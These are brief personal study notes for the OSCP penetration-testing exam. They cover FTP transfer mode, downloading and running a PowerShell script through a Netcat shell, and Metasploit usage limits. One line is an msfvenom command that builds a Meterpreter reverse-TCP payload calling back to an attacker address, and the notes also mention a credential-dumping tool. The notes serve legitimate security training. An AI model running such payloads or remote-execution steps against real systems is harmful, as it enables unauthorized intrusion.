---
description: Just some rough notes in preparation for the OSCP.
---

# OSCP Notes

* Transferring a file such as a .doc to a FTP share? Reminder to use `binary` before doing so or else it will upload as ASCII.&#x20;
* If you have a shell via Netcat on a Windows machine, try using Curl to download a  ps1 to the target and executing it.
  * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh -o meterpreter-64.ps1`
* Metasploit and Meterpreter are only allowed against one machine in the exam so ensure that you are sure before executing. There may be other ways to accomplish what you want (e.g., CrackMapExec, Lsassy, etc).&#x20;
